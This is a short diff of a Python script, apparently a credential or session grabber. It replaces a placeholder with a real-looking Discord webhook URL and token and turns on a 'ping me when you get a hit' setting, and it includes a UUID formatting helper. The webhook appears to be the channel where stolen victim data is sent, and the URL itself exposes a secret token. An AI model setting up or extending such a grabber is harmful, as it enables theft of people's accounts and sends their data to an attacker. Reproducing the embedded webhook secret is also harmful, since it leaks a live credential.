@@ -3,10 +3,10 @@ import os
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = "WEBHOOK HERE"
+WEBHOOK_URL = "https://canary.discord.com/api/webhooks/870402548966756423/OeavkXp-uL7QTXH8tH7RGzY0Nzg2nmhwq9zn16k-7l6f8XL1xqp3kQYRK3YrDu-9BAjr"
 
 # mentions you when you get a hit
-PING_ME = False
+PING_ME = True
 
 def uuid_dashed(uuid):
     return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
